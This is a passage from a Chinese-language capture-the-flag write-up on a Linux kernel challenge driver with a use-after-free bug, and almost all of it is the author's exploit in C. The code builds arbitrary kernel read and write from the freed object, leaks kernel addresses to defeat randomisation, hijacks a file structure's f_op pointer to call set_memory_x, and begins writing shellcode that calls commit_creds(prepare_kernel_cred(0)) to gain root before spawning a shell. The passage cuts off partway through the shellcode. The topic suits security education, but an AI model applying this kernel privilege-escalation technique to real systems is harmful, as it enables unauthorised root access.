<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>漏洞很简单，free 后指针未置为 NULL，可以 UAF</p>
<p>比较简单的方式是，UAF 修改 cred 结构体，但是题目的内核使用了一种 cred_jar 的安全机制，cred 的分配独立于普通的 malloc，所以无法使用这种方式</p>
<p>那么还可以利用 tty_struct 来劫持程序控制流执行 <code>commit_creds(prepare_kernel_cred(0))</code></p>
<p>也可以修改 file 结构体的 f_ops 指针来劫持程序控制流，并且 f_ops 调用时，rdi 寄存器指向的就是 file 结构体，可以利用 <code>set_memory_x(addr)</code> 来将 file 结构体的内存设置为可执行，随后布置 shellcode 执行 <code>commit_creds(prepare_kernel_cred(0))</code> 得到 root 权限</p>
<p>这部分比较简单，就直接放出 exp 了，相信结合注释很容易就看懂了：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">KERNCALL</span> <span class="token expression"><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">regparm</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PREPARE_KERNEL_CRED</span> <span class="token expression"><span class="token number">0xffffffff8108c2f0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">COMMIT_CREDS</span> <span class="token expression"><span class="token number">0xffffffff8108c0c0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SET_MEMORY_X</span> <span class="token expression"><span class="token number">0xffffffff8105b0d0</span></span></span>

<span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>mem<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MEM_SCAN_SIZE</span> <span class="token expression"><span class="token number">0x10000000</span></span></span>
<span class="token class-name">uint64_t</span> buffer<span class="token punctuation">[</span>MEM_SCAN_SIZE <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> fd<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">ctf_data</span> ctf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">;</span> 
<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> KERNCALL <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0</span><span class="token punctuation">;</span> 

<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">ssize_t</span> <span class="token function">alloc</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">ssize_t</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1338</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> size<span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>addr<span class="token punctuation">;</span>
    ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"setup uaf...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token function">alloc</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">delete</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token function">alloc</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">delete</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token function">alloc</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token comment">// ctf[0] -> fd[1]'s ctf_data</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// ctf[1] -> fd[2]'s ctf_data</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ctf_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed to setup uaf(1)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">!=</span> <span class="token number">2000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed to setup uaf(2)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// search file whose private_data point to ctf[0].mem (fd[1]'s ctf_data.mem -> ctf[1])</span>
    <span class="token class-name">uint64_t</span> start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem <span class="token operator">&amp;</span> <span class="token number">0xfffffffff0000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> target <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"from %p to %p search %lx\n"</span><span class="token punctuation">,</span> start<span class="token punctuation">,</span> start <span class="token operator">+</span> MEM_SCAN_SIZE<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> MEM_SCAN_SIZE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token class-name">uint64_t</span> file_addr <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token operator">+</span>i<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xc8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// offset of file.private_data = 0xc8</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"found at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token operator">+</span>i<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            file_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>ctf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token operator">+</span>i<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_addr <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak infomation\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">uint64_t</span> vfsmount_ <span class="token operator">=</span> buffer<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// (struct file).f_path.mnt</span>
    <span class="token class-name">uint64_t</span> fop <span class="token operator">=</span> buffer<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// (struct file).f_op</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"vfsmount = %p\n"</span><span class="token punctuation">,</span> vfsmount_<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fop = %p\n"</span><span class="token punctuation">,</span> fop<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>vfsmount_<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">uint64_t</span> init_user_ns <span class="token operator">=</span> buffer<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// vfsmount_.mnt_userns</span>
    <span class="token class-name">uint64_t</span> kernel_offset <span class="token operator">=</span> init_user_ns <span class="token operator">-</span> <span class="token number">0xffffffff8244c020</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"init_user_ns = %p\n"</span><span class="token punctuation">,</span> init_user_ns<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"save file's memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> save_file<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> save_file<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">memcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> save_file<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"change file's fop\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> fake_fop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> ctf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mem<span class="token punctuation">;</span>
    buffer<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_fop<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>file_addr<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>save_file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"set file's fop\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_read</span><span class="token punctuation">(</span>fop<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">uint64_t</span> shellcode_addr <span class="token operator">=</span> file_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
    buffer<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> SET_MEMORY_X<span class="token punctuation">;</span> <span class="token comment">// read</span>
    buffer<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> shellcode_addr<span class="token punctuation">;</span> <span class="token comment">// write (shellcode addr)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">arb_write</span><span class="token punctuation">(</span>fake_fop<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"set file_addr executable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write shellcode\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'\x48'</span><span class="token punctuation">,</span> <span class="token string">'\x31'</span><span class="token punctuation">,</span> <span class="token string">'\xff'</span><span class="token punctuation">,</span>                 <span class="token comment">// xor rdi, rdi</span>
        <span class="token string">'\x48'</span><span class="token punctuation">,</span> <span class="token string">'\xbe'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// movabs rsi, 0</span>
        <span class="token string">'\xff'</span><span class="token punctuation">,</span> <span class="token string">'\xd6'</span><span class="token punctuation">,</span>                         <span class="token comment">// call rsi</span>
        <span class="token string">'\x48'</span><span class="token punctuation">,</span> <span class="token string">'\xbe'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// movabs rsi, 0</span>
        <span class="token string">'\xff'</span><span class="token punctuation">,</span> <span class="token string">'\xd6'</span><span class="token punctuation">,</span>                         <span class="token comment">// call rsi</span>
        <span class="token string">'\xc3'</span><span class="token punctuation">,</span>                                 <span class="token comment">// ret</span>

    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

